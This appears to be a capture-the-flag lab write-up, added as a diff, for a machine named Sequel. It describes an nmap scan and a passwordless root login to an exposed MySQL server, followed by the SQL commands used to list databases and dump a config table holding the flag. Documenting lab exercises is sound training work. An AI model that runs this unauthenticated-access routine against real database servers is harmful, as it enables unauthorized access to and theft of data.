@@ -1,0 +1,49 @@
+Sequel Lab Report:
+
+
+Nmap Scan Report:
+
+  3306/tcp open  mysql   MySQL 8.0.x
+
+
+Findings:
+
+  The MySQL service was exposed to the network and allowed authentication without a password.
+
+  Successfully connected to the MySQL server using the root account with no password.
+
+  Enumerated available databases and discovered:
+    information_schema
+    mysql
+    performance_schema
+    htb
+
+  The htb database contained a table named config with sensitive information including the user flag.
+
+
+Exploit:
+
+  MySQL login with no password for root user
+    >mysql -h 10.129.x.x -u root
+    Welcome to the MySQL monitor.
+  
+  Displayed the databases
+    mysql> SHOW DATABASES;
+      information_schema
+      mysql
+      performance_schema
+      htb
+
+  User Flag was present on htb database
+    mysql> USE htb;
+    Database changed
+
+    mysql> SHOW TABLES;
+    config
+
+    mysql> SELECT * FROM config;
+
+  Enumerated the contents of the config table and obtained the user flag stored inside the database.
+
+  Successfully gained access to sensitive information due to insecure MySQL configuration allowing unauthenticated root access.
+
